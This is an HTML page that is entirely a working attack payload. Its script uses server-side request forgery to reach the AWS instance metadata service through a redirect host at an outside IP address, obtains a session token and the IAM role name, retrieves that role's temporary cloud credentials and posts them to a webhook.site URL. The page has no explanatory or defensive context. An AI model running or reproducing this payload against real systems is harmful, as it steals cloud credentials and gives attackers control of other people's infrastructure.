<html>
  <body>
    <script>
      try {
        // 1. Token
        var xhr1 = new XMLHttpRequest();
        xhr1.open("PUT", "http://13.221.230.104/redir.php?url=http://169.254.169.254/latest/api/token", false);
        xhr1.setRequestHeader("X-aws-ec2-metadata-token-ttl-seconds", "21600");
        xhr1.send();
        var token = xhr1.responseText;

        // 2. Get IAM role
        var xhr2 = new XMLHttpRequest();
        xhr2.open("GET", "http://13.221.230.104/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/", false);
        xhr2.setRequestHeader("X-aws-ec2-metadata-token", token);
        xhr2.send();
        var role = xhr2.responseText.trim();

        // 3. Get credentials
        var xhr3 = new XMLHttpRequest();
        xhr3.open("GET", "http://13.221.230.104/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" + encodeURIComponent(role), false);
        xhr3.setRequestHeader("X-aws-ec2-metadata-token", token);
        xhr3.send();
        var creds = xhr3.responseText;

        // 4. שליחה ל־Webhook
        var xhr4 = new XMLHttpRequest();
        xhr4.open("POST", "https://webhook.site/565628b3-9556-8e01-88059325cb8d", false);
        xhr4.setRequestHeader("Content-Type", "application/json");
        xhr4.send(JSON.stringify({creds: creds}));
      } catch(e) {
        console.error(e);
      }
    </script>
  </body>
</html>
